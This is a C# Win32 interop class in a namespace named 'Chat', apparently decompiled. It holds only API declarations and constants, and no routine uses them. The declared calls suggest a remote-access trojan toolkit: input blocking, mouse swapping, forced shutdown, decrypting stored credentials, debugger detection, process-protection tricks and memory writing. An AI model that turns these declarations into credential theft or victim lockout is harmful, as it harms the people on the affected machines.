namespace Chat
{
    using System;
    using System.Collections.ObjectModel;
    using System.Runtime.CompilerServices;
    using System.Runtime.ConstrainedExecution;
    using System.Runtime.InteropServices;
    using System.Security;
    using System.Text;
    using System.Threading;
    using System.Windows.Forms;

    public class Win32
    {
        public static Collection<IntPtr> ActiveWindows = new Collection<IntPtr>();
        public const int EWX_FORCE = 4;
        public const int EWX_FORCEIFHUNG = 0x10;
        public const int EWX_LOGOFF = 0;
        public const int EWX_POWEROFF = 8;
        public const int EWX_REBOOT = 2;
        public const int EWX_SHUTDOWN = 1;
        public Thread ReadingThread;
        public const int SC_SCREENSAVE = 0xf140;
        public const int SE_PRIVILEGE_ENABLED = 2;
        public const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
        public const int SW_HIDE = 0;
        public const int SW_SHOW = 1;
        public const int TOKEN_ADJUST_PRIVILEGES = 0x20;
        public const int TOKEN_QUERY = 8;
        public const int Windows = 11;
        public const int WM_SYSCOMMAND = 0x112;

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
        [DllImport("kernel32")]
        public static extern bool AllocConsole();
        [DllImport("user32.dll")]
        public static extern long BlockInput(bool fBlockIt);
        [DllImport("kernel32.dll")]
        public static extern bool CopyFile(string lpExistingFileName, string lpNewFileName, bool bFailIfExists);
        [DllImport("kernel32.dll", CharSet=CharSet.Auto, SetLastError=true)]
        public static extern bool CreateDirectory(string lpPathName, SECURITY_ATTRIBUTES lpSecurityAttributes);
        [DllImport("Crypt32.dll", CharSet=CharSet.Auto, SetLastError=true)]
        public static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, string szDataDescr, ref DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);
        [SecurityCritical]
        internal static bool DoesWin32MethodExist(string moduleName, string methodName)
        {
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            if (moduleHandle == IntPtr.Zero)
            {
                return false;
            }
            return (GetProcAddress(moduleHandle, methodName) != IntPtr.Zero);
        }

        [DllImport("user32.dll")]
        public static extern int EnableWindow(int hwnd, int nOption);
        [DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
        public static extern bool EnumWindows(EnumWindowsProc callback, IntPtr extraData);
        [DllImport("user32.dll", SetLastError=true)]
        public static extern bool ExitWindowsEx(int flg, int rea);
        [DllImport("user32.dll")]
        public static extern int FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
        public static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string lclassName, string windowTitle);
        [DllImport("kernel32.dll")]
        public static extern int FreeConsole();
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentProcess();
        [DllImport("user32.dll")]
        public static extern int GetDesktopWindow();
        [DllImport("iphlpapi.dll", SetLastError=true)]
        public static extern uint GetExtendedTcpTable(IntPtr pTcpTable, ref int dwOutBufLen, bool sort, int ipVersion, TCP_TABLE_CLASS tblClass, int reserved);
        [DllImport("iphlpapi.dll", SetLastError=true)]
        public static extern uint GetExtendedUdpTable(IntPtr pUdpTable, ref int dwOutBufLen, bool sort, int ipVersion, UDP_TABLE_CLASS tblClass, int reserved);
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();
        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, ref uint lpnLengthNeeded);
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail), DllImport("kernel32.dll", CharSet=CharSet.Auto, SetLastError=true)]
        public static extern IntPtr GetModuleHandle(string moduleName);
        [SecuritySafeCritical]
        public static string GetOSArchitecture()
        {
            bool flag;
            if (IntPtr.Size != 8)
            {
            }
            if ((DoesWin32MethodExist("kernel32.dll", "IsWow64Process") && IsWow64Process(GetCurrentProcess(), ref flag)) && flag)
            {
                return "x64";
            }
            return "x86";
        }

        [DllImport("advapi32.dll", EntryPoint="LookupPrivilegeValue")]
        public static extern bool GetPrivilegeID(string machine, string name, ref long luid);
        [DllImport("kernel32.dll", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("user32.dll", SetLastError=true)]
        public static extern IntPtr GetWindow(IntPtr hWnd, GetWindow_Cmd uCmd);
        [DllImport("user32.dll")]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int Count);
        [DllImport("kernel32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
        public static extern bool IsDebuggerPresent();
        [DllImport("user32.dll")]
        public static extern IntPtr IsIconic(IntPtr hwnd);
        [DllImport("shlwapi.dll", EntryPoint="#437", SetLastError=true)]
        public static extern bool IsOS(int os);
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
        public static extern bool IsWindowVisible(IntPtr hWnd);
        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("kernel32.dll", SetLastError=true)]
        internal static extern bool IsWow64Process([In] IntPtr hSourceProcessHandle, [MarshalAs(UnmanagedType.Bool)] ref bool isWow64);
        [DllImport("user32.dll")]
        public static extern IntPtr IsZoomed(IntPtr hwnd);
        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
        [DllImport("winmm.dll")]
        public static extern void mciSendStringA(string lpstrCommand, string lpstrReturnString, long uReturnLength, long hwndCallback);
        [return: MarshalAs(UnmanagedType.U4)]
        [DllImport("user32.dll", EntryPoint="MessageBoxW", CharSet=CharSet.Unicode, SetLastError=true)]
        public static extern MessageBoxResult MessageBox(IntPtr hwnd, [MarshalAs(UnmanagedType.LPTStr)] string lpText, [MarshalAs(UnmanagedType.LPTStr)] string lpCaption, [MarshalAs(UnmanagedType.U4)] MessageBoxOptions uType);
        [DllImport("kernel32.dll")]
        public static extern bool MoveFileEx(string fileName, string newName, uint flags);
        [DllImport("ntdll.dll", SetLastError=true)]
        public static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
        [DllImport("advapi32.dll", EntryPoint="OpenProcessToken")]
        public static extern bool OpenToken(IntPtr handle, uint access, ref IntPtr token);
        [DllImport("advapi32.dll")]
        public static extern long RegDeleteKeyValue(IntPtr handle, string keyName, string valueName);
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
        public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll")]
        public static extern int SendMessageA(IntPtr Hwnd, int Message, int wParam, int lParam);
        [DllImport("kernel32.dll")]
        public static extern bool SetConsoleCtrlHandler(ConsoleEventDelegate handlerRoutine, bool add);
        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);
        [DllImport("advapi32.dll", EntryPoint="AdjustTokenPrivileges")]
        public static extern bool SetPrivilege(IntPtr token, bool release, ref TokenPrivilege newState, uint zero1, IntPtr zero2, IntPtr zero3);
        [DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
        public static extern bool SetWindowText(IntPtr hwnd, string lpString);
        [DllImport("user32.dll")]
        public static extern IntPtr ShowWindow(IntPtr hwnd, IntPtr nCmdShow);
        [DllImport("advapi32.dll", EntryPoint="InitiateSystemShutdownEx")]
        public static extern bool ShutdownEx(string machine, string message, uint timeout, bool force, bool reboot, uint reason);
        [DllImport("User32.dll")]
        public static extern bool SwapMouseButton(IntPtr fSwap);
        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, ref uint lpNumberOfBytesWritten);
        [DllImport("ntdll.dll")]
        public static extern IntPtr ZwSetInformationProcess(IntPtr _1, IntPtr _2, IntPtr _3, IntPtr _4);

        public delegate bool CallBack(IntPtr hwnd, IntPtr lParam);

        public enum ConsoleEvent
        {
            CTRL_BREAK_EVENT = 1,
            CTRL_C_EVENT = 0,
            CTRL_CLOSE_EVENT = 2,
            CTRL_LOGOFF_EVENT = 5,
            CTRL_SHUTDOWN_EVENT = 6
        }

        public delegate bool ConsoleEventDelegate(Win32.ConsoleEvent MyEvent);

        [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
        public struct CRYPTPROTECT_PROMPTSTRUCT
        {
            public int cbSize;
            public Win32.CryptProtectPromptFlags dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }

        [Flags]
        public enum CryptProtectPromptFlags
        {
            CRYPTPROTECT_PROMPT_ON_PROTECT = 2,
            CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1
        }

        [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
        public struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }

        public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        public enum GetWindow_Cmd : uint
        {
            GW_CHILD = 5,
            GW_ENABLEDPOPUP = 6,
            GW_HWNDFIRST = 0,
            GW_HWNDLAST = 1,
            GW_HWNDNEXT = 2,
            GW_HWNDPREV = 3,
            GW_OWNER = 4
        }

        public enum MessageBoxResult : uint
        {
            Abort = 3,
            Cancel = 2,
            Close = 8,
            ContinueOn = 11,
            Help = 9,
            Ignore = 5,
            No = 7,
            Ok = 1,
            Retry = 4,
            Timeout = 0x7d00,
            TryAgain = 10,
            Yes = 6
        }

        private enum RegHive
        {
            HKEY_CLASSES_ROOT = -2147483648,
            HKEY_CURRENT_CONFIG = -2147483643,
            HKEY_CURRENT_USER = -2147483647,
            HKEY_LOCAL_MACHINE = -2147483646,
            HKEY_USERS = -2147483645
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public int lpSecurityDescriptor;
            public int bInheritHandle;
        }

        public enum TCP_TABLE_CLASS
        {
            TCP_TABLE_BASIC_LISTENER,
            TCP_TABLE_BASIC_CONNECTIONS,
            TCP_TABLE_BASIC_ALL,
            TCP_TABLE_OWNER_PID_LISTENER,
            TCP_TABLE_OWNER_PID_CONNECTIONS,
            TCP_TABLE_OWNER_PID_ALL,
            TCP_TABLE_OWNER_MODULE_LISTENER,
            TCP_TABLE_OWNER_MODULE_CONNECTIONS,
            TCP_TABLE_OWNER_MODULE_ALL
        }

        [StructLayout(LayoutKind.Sequential, Pack=1)]
        public struct TokenPrivilege
        {
            public uint Count;
            public long LUID;
            public uint Flags;
        }

        [StructLayout(LayoutKind.Sequential, Pack=1)]
        public struct TokPriv1Luid
        {
            public int Count;
            public long Luid;
            public int Attr;
        }

        public enum UDP_TABLE_CLASS
        {
            UDP_TABLE_BASIC,
            UDP_TABLE_OWNER_PID,
            UDP_TABLE_OWNER_MODULE
        }
    }
}

